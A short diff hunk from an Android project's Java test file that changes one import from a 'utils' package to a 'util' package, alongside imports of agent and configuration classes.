@@ -13,7 +13,7 @@ import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.AgentBase;
 import com.ht.RCSAndroidGUI.agent.AgentManager;
 import com.ht.RCSAndroidGUI.conf.Configuration;
-import com.ht.RCSAndroidGUI.utils.Utils;
+import com.ht.RCSAndroidGUI.util.Utils;
 
 import android.content.res.Resources;
 import android.test.AndroidTestCase;
